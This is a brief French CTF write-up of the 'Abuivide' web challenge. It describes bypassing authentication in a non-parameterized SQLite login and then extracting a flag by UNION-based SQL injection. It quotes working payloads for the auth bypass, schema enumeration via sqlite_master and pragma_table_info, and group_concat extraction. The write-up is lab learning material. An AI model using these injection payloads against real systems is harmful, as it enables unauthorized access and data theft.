---
doc_kind: writeup
title: Abuivide
category: web
slug: abuivide-sqli-union
created: 2026-10-29
status: solved
tags:
  - web
  - sqli
  - union-based
  - sqlite
  - auth-bypass
source: "ESIG TECH ARENA CTF 2026"
target: "Login SQLite non parametre"
---
# Abuivide

## Challenge Summary

- Source: ESIG TECH ARENA CTF 2026
- Target: Login SQLite non parametre
- Goal: Injection SQL classique dans le login pour bypass auth, puis extraction du flag via UNION SELECT sur une table separee non liee au compte admin.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. Indice sur /login: "essayez ' OR 1=1 -- -".
2. Bypass auth: connexion admin (id=1), mais le mot de passe affiche est un piege, pas le flag.
3. Determination du nombre de colonnes par UNION SELECT (3 colonnes).
4. Enumeration tables SQLite via sqlite_master -> tables users, flags.
5. pragma_table_info('flags') -> colonnes id, flag.
6. UNION SELECT group_concat(flag,'|') FROM flags -> flag affiche.

## Key Evidence

- Payload "' UNION SELECT 1, group_concat(flag,'|'), 'x' FROM flags -- -"; flag EthACTF{sqli_leaks_everything}.

## Dead Ends

- Le mot de passe admin affiche apres bypass etait un piege, pas le flag reel.

## Payloads And Commands

```text
Injection SQL UNION-based sur champ username (SQLite).
```

## Flag / Outcome

- EthACTF{sqli_leaks_everything}

## Reusable Lessons

- SQLi UNION-based: ne pas s'arreter au bypass d'auth, verifier systematiquement si une table separee (ex: flags) est lisible par la meme injection.

## Pattern Candidates

- Lie au pattern existant ssrf-ip-bypass / pas de nouveau pattern necessaire, mais utile a noter.
